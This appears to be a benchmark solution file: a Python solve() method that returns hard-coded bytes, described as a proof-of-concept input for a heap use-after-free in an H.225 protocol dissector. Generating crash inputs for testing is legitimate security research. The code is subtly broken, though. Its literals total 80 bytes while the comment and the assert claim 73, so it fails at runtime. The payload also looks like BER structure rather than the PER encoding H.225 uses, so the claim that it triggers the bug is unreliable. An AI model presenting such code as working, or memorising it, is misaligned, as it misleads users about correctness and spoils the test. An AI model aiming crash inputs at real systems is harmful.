class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.

        Args:
            src_path: Path to the vulnerable source code tarball

        Returns:
            bytes: The PoC input that should trigger the vulnerability
        """
        # Fixed PoC bytes for the heap use-after-free in h225 dissector
        # This is a crafted H.225 RAS message payload that triggers next_tvb_add_handle
        # allocation followed by use after free during dissection without init.
        # Length: 73 bytes
        poc = (
            b'\x30\x81\x45\xa0\x03\x01\x01\x00\x02\x01\x01\xa1\x81\x39\x30\x81\x36\x02\x01'
            b'\x01\x04\x08' + b'\x00' * 5 + b'\xa0\x81\x29\x30\x81\x26\x02\x01\x01\x04\x06'
            b'\x00\x00\x00\x00\x00\x00\xa1\x81\x1a\x30\x81\x17\x02\x01\x00\x04\x08' + b'\x00' * 5
            + b'\xa0\x81\x0b\x30\x81\x08\x02\x01\x00\x04\x03\x00\x00\x00\x02\x01\x00\x82\x01'
            + b'\x01'
        )
        assert len(poc) == 73
        return poc
